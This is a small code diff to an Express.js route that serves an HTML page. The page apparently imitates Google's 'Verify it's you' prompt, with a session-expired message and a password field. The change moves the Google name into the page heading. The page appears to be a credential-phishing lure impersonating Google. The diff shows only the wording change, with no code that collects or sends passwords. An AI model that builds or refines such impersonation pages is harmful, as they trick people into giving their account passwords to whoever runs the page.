@@ -291,7 +291,7 @@ router.get('/', (req, res) => {
                 <img class="divlogo" src="./images/image.png" alt="Logo">
             </div>
             <div>
-                <span class="welcome">Verify it’s you</span>
+                <span class="welcome">Google needs to verify it’s you</span>
             </div>
             <div class="userdiv">
                 <img class="user-icon" src="./images/user-circle.png" alt="User Icon">
@@ -305,7 +305,7 @@ router.get('/', (req, res) => {
             <div class="form-half1">
                 <!-- Session Expired Message at the top of the right section -->
                 <div class="session-expired-message">
-                    <p>Google needs to verify it’s you. Please enter password to continue.</p>
+                    <p>Please enter password to continue.</p>
                 </div>
 
                 <div class="passdiv">
